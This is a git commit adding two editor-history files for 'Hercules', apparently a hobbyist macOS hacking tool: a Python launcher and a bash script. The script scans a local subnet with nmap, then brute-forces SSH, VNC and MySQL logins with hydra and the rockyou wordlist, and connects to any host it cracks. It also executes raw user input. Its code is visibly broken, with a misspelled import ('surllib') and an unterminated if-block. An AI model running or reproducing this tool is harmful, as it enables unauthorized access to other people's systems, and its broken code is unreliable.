588686c1390cb8ff55306b27a7130b94a58db66f
Will Segale <39059459+WilSegale@users.noreply.github.com>
2023-12-17 14:54:58 -0500

    hercules

---
+++ mac/.history/Hercules_20230805092426.py
@@ -0,0 +1,48 @@
+from tqdm import tqdm
+import datetime
+import platform
+import time
+import os
+import surllib.request
+import logging
+
+# gets the current time and formats it HH:MM:SS
+current_time = datetime.datetime.now().time()
+formatted_time = current_time.strftime("%I:%M:%S %p")
+
+# Get the current date
+current_date = datetime.datetime.now().strftime("%m/%d/%Y")
+
+# easy way to read the root user function
+root = 0
+
+# makes the log file accessible to read for the user and developer
+logging.basicConfig(filename="ERROR.log", level=logging.ERROR)
+
+
+def connect(host="google.com"):
+    try:
+        urllib.request.urlopen("http://" + host)  # Try to open a connection to the host
+        return True  # If successful, return True
+    except:
+        return False  # If unsuccessful, return False
+
+
+if connect() == True:  # Makes sure that the user is connected to the internet
+    if platform.system() == "Darwin":  # Check if the current OS is macOS
+        if os.geteuid() == root:  # Check if running as root
+            with tqdm(total=100, ascii=False, bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}', ncols=80,
+                      colour="green", desc="Loading Hercules", dynamic_ncols=True) as pbar:
+                for _ in range(100):
+                    time.sleep(0.1)  # Simulate loading delay
+                    pbar.update(1)
+            os.system("bash script.sh")  # Replace with your actual script to run after loading
+        else:
+            logging.critical(f"TIME:{formatted_time} Please run as root. DATE:{current_date}")
+            print(f"TIME:{formatted_time} Please run as root. DATE:{current_date}")
+    else:
+        logging.warning(f"TIME:{formatted_time} Wrong OS. Please use the correct OS. DATE:{current_date}")
+        print(f"TIME:{formatted_time} Wrong OS. Please use the correct OS. DATE:{current_date}")
+else:
+    logging.critical(f"TIME:{formatted_time} You are offline. Please connect to the internet. DATE:{current_date}")
+    print(f"TIME:{formatted_time} You are offline. Please connect to the internet. Date:{current_date}")
---
+++ mac/.history/script_20230805084847.sh
@@ -0,0 +1,153 @@
+#!/bin/bash
+
+#yes 
+yes=("yes" "Yes" "YES")
+
+# Root user
+root=0
+
+# Gets the current time in a 12-hour format
+CURRENT_TIME=$(date +"%I:%M:%S %p")
+
+# Gets current date in mm/dd/yyyy format
+CURRENT_DATE=$(date +"%m/%d/%Y")
+
+if [[ "$OSTYPE" == "darwin"* ]]; then
+    clear
+    if [[ $EUID -ne $root ]]; then
+        # Error message if not running as root
+        echo "ERROR:root:TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE" >> ERROR.LOG
+        echo "TIME:$CURRENT_TIME Please run as root. DATE:$CURRENT_DATE"
+        exit
+    else
+        sudo rm -rf hydra.restore
+        clear
+
+        wget -q --spider http://google.com
+
+        # If the user is connected to the internet, it works as normal
+        if [[ $? -eq 0 ]]; then
+            echo
+        
+        # Else, it notifies them that they are not connected to the internet and tells them to connect
+        else
+            # Error message if offline
+            echo "ERROR:root:TIME:$CURRENT_TIME You are offline. Please connect to the internet. DATE:$CURRENT_DATE." >> ERROR.LOG
+            echo "TIME:$CURRENT_TIME You are offline. Please connect to the internet. DATE:$CURRENT_DATE"
+        fi
+
+        # clear the terminal
+        clear
+
+        #tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
+        Hercules() {
+            # The logo of the program
+            figlet -f slant "Hercules"
+
+            echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL': "
+            read -p ">>> " service
+
+            if [[ $service == "ALL" || $service == "all" ]]; then
+                # Tells the user that it can take up to an hour to complete the scanning process
+                echo "This can take up to 1 hour to complete."
+                # Scan the entire network and display open ports
+                sudo nmap -sS 192.168.1.1/24 -Pn -oN scan.txt -A --open
+                hydra -h
+                echo "Put in hydra first to start the script."
+                read -p ">>> " Hydra
+                $Hydra
+                if [[ $Hydra == "exit" ]]; then
+                    
+            else
+                # Scan specific port
+                sudo nmap -sS 192.168.1.1/24 -p $service --open
+            fi
+        }
+
+        RunHackingCommand() {
+            #break in the outputs of my code
+            echo 
+            #services to crack the network
+            echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
+            echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
+            read -p "Input Username: " user
+            read -p "Input Hostname: " host
+        }
+
+        RunHackingCommandWithVNC() {
+            if [[ $service == 5900 || $service == "VNC" ]]; then
+                # Checks if the user has put anything in the 'Input Username' function and the hostname function
+                # If not, it will prompt the user to enter the username and hostname
+                if [[ $user == "" && $host == "" || $host == "" ]]; then
+                    # No service specified, re-prompt for input
+                    echo "No service specified"
+                    RunHackingCommand
+                # If the user inputs something in the 'Input Username' function and the hostname function,
+                # it will continue as normal
+                else
+                    # Crack VNC password
+                    hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host
+                    echo "Loading VNC server..."
+                    open vnc://$host
+                    exit
+                fi
+            fi
+        }
+
+        RunHackingCommandWithSSH() {
+            if [[ $service == 22 || $service == "ssh" ]]; then
+                # Checks if the user has put anything in the 'Input Username' function and the hostname function
+                # If not, it will prompt the user to enter the username and hostname
+                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
+                    # No service specified, re-prompt for input
+                    echo "No service specified"
+                    RunHackingCommand
+                # If the user inputs something in the 'Input Username' function and the hostname function,
+                # it will continue as normal
+                else
+
+                    # Crack SSH password
+                    hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host
+                    echo "Connecting to $user@$host"
+                    sleep 3
+                    ssh $user@$host
+                fi
+            fi
+        }
+
+        RunHackingCommandWithMySQL() {
+            if [[ $service == 3306 || $service == "mysql" ]]; then
+                # Checks if the user has put anything in the 'Input Username' function and the hostname function
+                # If not, it will prompt the user to enter the username and hostname
+                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
+                    # No service specified, re-prompt for input
+                    echo "No service specified"
+                    RunHackingCommand
+                # If the user inputs something in the 'Input Username' function and the hostname function,
+                # it will continue as normal
+                else
+                    # Crack MySQL password
+                    hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host
+                    echo "Loading MySQL server..."
+                    sleep 3
+                    mysql -u $user -p -A
+                fi
+            fi
+        }
+        
+        Hercules # Calls the Hercules function
+
+        RunHackingCommand # Calls the RunHackingCommand function
+
+        RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function
+
+        RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function
+
+        RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
+    fi
+else
+    clear
+    # Warning message for wrong OS
+    echo "WARNING:root:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
+    echo "TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
+fi
